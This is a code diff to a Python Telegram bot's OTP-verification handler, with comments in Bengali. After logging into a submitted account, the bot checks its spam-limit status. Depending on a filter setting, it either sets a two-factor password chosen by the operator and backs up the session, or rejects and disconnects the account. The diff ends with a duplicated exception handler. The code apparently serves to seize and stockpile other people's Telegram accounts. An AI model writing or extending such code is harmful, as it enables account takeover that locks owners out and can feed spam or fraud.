@@ -672,33 +672,42 @@ async def verify_otp_task(text, user_id, message):
         is_limited = "limited" in status.lower()
         is_filter_on = settings.get("spam_filter_active", True)
 
-        # লজিক: ফিল্টার ON থাকলে
+        # লজিক ১: ফিল্টার ON থাকলে
         if is_filter_on:
             if not is_limited:
-                # স্প্যাম ফ্রি: ২-এফএ লাগাও এবং সরাসরি কনফার্মেশনে যাও
+                # স্প্যাম ফ্রি: ২-এফএ লাগাও এবং কনফার্মেশনে যাও
                 await data["client"].edit_2fa(new_password=settings["security_password"])
                 await process_backup(user_id, message, data)
-                return # এখানে রিটার্ন দিয়েছি যাতে কনফার্মেশনের পর আর রিজেক্ট না হয়
-            else:
-                # স্প্যাম হলে রিজেক্ট
-                bot.reply_to(message, "🚫 **Access Denied:** Account is Limited.")
-                try: await data["client"].disconnect()
-                except: pass
-                del user_data[user_id]
                 return
-
-        # লজিক: ফিল্টার OFF থাকলে
+            else:
+                # স্প্যাম হলে রিজেক্ট (কোনো পাসওয়ার্ড লাগবে না)
+                bot.reply_to(message, "🚫 **Access Denied:** Account is Limited.")
+        
+        # লজিক ২: ফিল্টার OFF থাকলে
         else:
             if is_limited:
-                # স্প্যাম একাউন্ট হলে ২-এফএ লাগাও এবং কনফার্মেশনে যাও
+                # স্প্যাম হলে: ২-এফএ লাগাও এবং কনফার্মেশনে যাও
                 await data["client"].edit_2fa(new_password=settings["security_password"])
                 await process_backup(user_id, message, data)
+                return
             else:
-                # স্প্যাম-ফ্রি হলে রিজেক্ট
+                # স্প্যাম ফ্রি হলে রিজেক্ট (কনফার্মেশনে যাবে না)
                 bot.reply_to(message, "🚫 **Access Denied:** Only Spam accounts are allowed.")
-                try: await data["client"].disconnect()
-                except: pass
-        
+
+        # ভুল বা রিজেক্ট হলে সেশন বন্ধ কর
+        try: await data["client"].disconnect()
+        except: pass
+        del user_data[user_id]
+
+    except SessionPasswordNeededError:
+        bot.reply_to(message, "❌ **Two-Step Verification Active.**")
+        try: await data["client"].disconnect()
+        except: pass
+        del user_data[user_id]
+    except Exception as e:
+        bot.reply_to(message, f"❌ **Error:** {str(e)}")
+        try: await data["client"].disconnect()
+        except: pass
         del user_data[user_id]
 
     except SessionPasswordNeededError:
